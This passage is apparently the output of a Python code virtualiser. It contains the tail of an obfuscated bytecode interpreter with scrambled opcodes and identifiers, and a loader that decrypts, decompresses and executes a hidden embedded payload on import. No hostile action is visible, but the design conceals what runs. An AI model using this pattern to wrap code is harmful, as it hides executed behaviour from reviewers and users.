          elif arg == 10:
            stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
        elif opcode == 3080:
          _r = stack.pop(); stack[-1] = stack[-1] ^ _r
        elif opcode == 1424:
          val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].append(val)
        elif opcode == 4677:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left is right)
        elif opcode == 3272:
          _tgxtukgtd = stack.pop(); _xuwpwtnu68 = stack[-1]
          stack[-1] = _xuwpwtnu68 + _tgxtukgtd - (_xuwpwtnu68 | _tgxtukgtd) if type(_xuwpwtnu68) is int and type(_tgxtukgtd) is int else _xuwpwtnu68 & _tgxtukgtd
        elif opcode == 1944:
          _v1 = fastlocals[arg[0]]; _v2 = consts[arg[1]]; stack.append(_v1 - _v2)
        elif opcode == 3703:
          key = stack.pop(); obj = stack.pop(); val = stack.pop(); obj[key] = val
        elif opcode == 2741:
          _b_0_0 = stack.pop(); _n = names[4]
          _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_2_obj = _b_1_0; _b_2_0 = getattr(_b_2_obj, names[10]); _b_3_0 = fastlocals[1]; stack.append(_b_2_0); stack.append(_b_3_0)
        elif opcode == 4939:
          _dvomov90z = frame._fib1v1p2[arg]; setattr(_dvomov90z, 'val', stack.pop())
        elif opcode == 1237:
          stack[-2] = stack[-2] @ stack[-1]; stack.pop()
        elif opcode == 3935:
          if arg == 0:
            stack.append(set())
          else:
            _xd0qml2a = set([stack.pop() for _ in range(arg)]); stack.append(_xd0qml2a)
        elif opcode == 4591:
          val = stack.pop()
          if not val:
            frame._uid5y5b4b = arg
        elif opcode == 337:
          _b_chk = None; _b_0_0 = fastlocals[1]; _b_1_0 = fastlocals[0]; _b_2_obj = _b_1_0; _b_2_val = _b_0_0
          setattr(_b_2_obj, names[0], _b_2_val)
        elif opcode == 2832:
          _b_chk = None; _b_0_0 = stack.pop(); locals_dict[names[5]] = _b_0_0; _b_1_0 = consts[4]; stack.append(_b_1_0)
        elif opcode == 4062:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left not in right)
        elif opcode == 3800:
          stack.append(getattr(stack[-1], names[arg]))
        elif opcode == 3117:
          right = stack.pop(); left = stack.pop(); stack.append(left // right)
        elif opcode == 3078:
          args = stack[-arg:] if arg > 0 else []
          if arg > 0:
            del stack[-arg:]
          func = stack.pop()
          if isinstance(func, _types.MethodType) and isinstance(func.__func__, _nij8gsyo):
            args = [func.__self__] + list(args); func = func.__func__
          if isinstance(func, _nij8gsyo):
            _fl = _ixnhvtom(func.code, args, {}, func.defaults, func.kw_defaults)
            frame._tz8dlqo3 = _d3kkohtuze(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
          else:
            stack.append(func(*args))
        elif opcode == 2997:
          _b_0_obj = stack.pop(); _b_0_0 = getattr(_b_0_obj, names[0]); _b_1_0 = fastlocals[0]; stack.append(_b_0_0); stack.append(_b_1_0)
        elif opcode == 297:
          right = stack.pop(); left = stack.pop()
          if arg == 0:
            stack.append(left < right)
          elif arg == 1:
            stack.append(left <= right)
          elif arg == 2:
            stack.append(left == right)
          elif arg == 3:
            stack.append(left != right)
          elif arg == 4:
            stack.append(left > right)
          elif arg == 5:
            stack.append(left >= right)
          elif arg == 6:
            stack.append(left in right)
          elif arg == 7:
            stack.append(left not in right)
          elif arg == 8:
            stack.append(left is right)
          elif arg == 9:
            stack.append(left is not right)
          elif arg == 10:
            stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
        elif opcode == 3405:
          stack.append(fastlocals[arg])
        elif opcode == 4091:
          stack[-2] = stack[-2] ** stack[-1]; stack.pop()
        elif opcode == 2425:
          _b = stack.pop(); _a = stack.pop()
          frame._st99omuow = (frame._st99omuow * 1664525 + 1013904223 ^ (_b if type(_b) is int else 0)) & 4294967295
          _res = _a + _b - (_a | _b) if type(_a) is int and type(_b) is int else _a & _b; stack.append(_res)
        elif opcode == 3697:
          while len(fastlocals) <= arg[1]:
            fastlocals.append(None)
          fastlocals[arg[1]] = fastlocals[arg[0]]
        elif opcode == 4564:
          right = stack.pop(); left = stack.pop(); stack.append(left @ right)
        elif opcode == 563:
          _b = stack.pop(); _a = stack.pop()
          _res = 2 * (_a | _b) - (_a ^ _b) + ((_a ^ _a) & 0) if type(_a) is int and type(_b) is int else _a + _b; stack.append(_res)
        elif opcode == 1329:
          stack.pop()
        elif opcode == 2069:
          _b_chk = None; _b_0_0 = stack.pop(); locals_dict[names[3]] = _b_0_0; _b_1_0 = consts[2]; stack.append(_b_1_0)
        elif opcode == 2710:
          key = stack.pop(); obj = stack.pop(); stack.append(obj[key])
        elif opcode == 124:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left in right)
        elif opcode == 414:
          if frame._ufc87zwsdu is not None:
            frame._ufc87zwsdu(None, None, None); frame._ufc87zwsdu = None
        elif opcode == 694:
          _t0_0 = stack.pop()
          while len(fastlocals) <= arg[0]:
            fastlocals.append(None)
          fastlocals[arg[0]] = _t0_0; _t1_0 = stack.pop()
          while len(fastlocals) <= arg[1]:
            fastlocals.append(None)
          fastlocals[arg[1]] = _t1_0
        elif opcode == 4102:
          _r = stack.pop(); stack[-1] = stack[-1] >> _r
        elif opcode == 1139:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left is not right)
        elif opcode == 3207:
          _top = stack.pop(); _sc = stack.pop(); stack.append(_top); stack.append(_sc)
        elif opcode == 3467:
          stack[-2] = stack[-2] / stack[-1]; stack.pop()
        elif opcode == 2898:
          _fl = fastlocals; stack.append(_fl[arg])
        elif opcode == 1302:
          globals_dict[names[arg]] = stack.pop()
        elif opcode == 2678:
          _b_chk = None; _b_0_0 = fastlocals[1]; _b_1_1 = _b_0_0; _b_1_0 = stack.pop()
          frame._st99omuow = (frame._st99omuow * 1103515245 + 12345 ^ (_b_1_0 if type(_b_1_0) is int else 0)) & 4294967295
          _b_1_res = (_b_1_0 ^ _b_1_1) + 2 * (_b_1_0 & _b_1_1) if type(_b_1_0) is int and type(_b_1_1) is int else _b_1_0 + _b_1_1
          stack.append(_b_1_res)
        elif opcode == 904:
          stack.extend([fastlocals[arg[0]] * fastlocals[arg[1]]])
        elif opcode == 2559:
          while len(fastlocals) <= arg:
            fastlocals.append(None)
          fastlocals[arg] = stack[-1]
        elif opcode == 3975:
          def _ji0b677f1e(func, name, *bases, **kwds):
            meta = kwds.get('metaclass')
            if meta is None:
              meta = type(bases[0]) if bases else type
            ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
            if hasattr(func, 'execute_with_locals'):
              func.execute_with_locals(ns)
            else:
              func()
            cls = meta(name, bases, ns, **kwds)
            for item in ns.values():
              if hasattr(item, '__code__'):
                item.__class_owner__ = cls
            return cls
          stack.append(_ji0b677f1e)
        elif opcode == 4089:
          if stack.pop():
            frame._uid5y5b4b = arg
        elif opcode == 814:
          _d0_0 = consts[arg[0]]; _d1_0 = consts[arg[1]]; _d2_0 = consts[arg[2]]; stack.append(_d0_0); stack.append(_d1_0)
          stack.append(_d2_0)
        elif opcode == 2651:
          _d0_obj = stack.pop(); _d0_0 = getattr(_d0_obj, names[arg[0]]); _d1_0 = consts[arg[1]]; stack.append(_d0_0); stack.append(_d1_0)
        if frame._tz8dlqo3 is not None:
          _injjqtbn = frame._tz8dlqo3; frame._tz8dlqo3 = None; _ag7wc90f(_injjqtbn); continue
      except Exception as exc:
        handled = False
        while True:
          while frame._d1qdt8v1:
            b = frame._d1qdt8v1.pop()
            if b.type == _wlv605g7.WITH:
              del stack[b.stack_height:]; suppress = False
              if b.exit_fn:
                try:
                  suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
                except Exception:
                  suppress = False
              if suppress:
                frame._uid5y5b4b = b.handler_pc; handled = True; break
            elif b.type in (_wlv605g7.EXCEPT, _wlv605g7.FINALLY):
              del stack[b.stack_height:]; stack.append(exc); frame._uid5y5b4b = b.handler_pc; handled = True; break
          if handled:
            break
          if _r46kxefv:
            frame = _r46kxefv.pop(); code = frame._klciqhp77v; instructions = code.instructions; consts = code.consts; names = code.names
            stack = frame._s3ku6nbyd; fastlocals = frame._rcwi8krk; globals_dict = frame._n4uhede3; locals_dict = frame._ckmwwn41
            builtins_dict = globals_dict.get('__builtins__')
            if isinstance(builtins_dict, type(_sys)):
              builtins_dict = builtins_dict.__dict__
            elif hasattr(builtins_dict, '__dict__'):
              builtins_dict = builtins_dict.__dict__
          else:
            break
        if not handled:
          raise
    return None
  finally:
    _boos13c4 = old_frame
def _r6dxoxd3():
  _psn = _lipflcl1(); decrypted = _g2ovdjqvu(_b64.b85decode(_f9tyquep()), _x78gms60x()); raw = _zlib.decompress(decrypted)
  reader = _gl2g3lsy(raw); root_code = _iq734t81(reader); g = globals()
  if '__builtins__' not in g:
    g['__builtins__'] = _builtins
  f = _d3kkohtuze(root_code, g, locals_dict=g)
  if _psn:
    f._st99omuow ^= _psn
  return _fs94yhmm(f)
_r6dxoxd3()
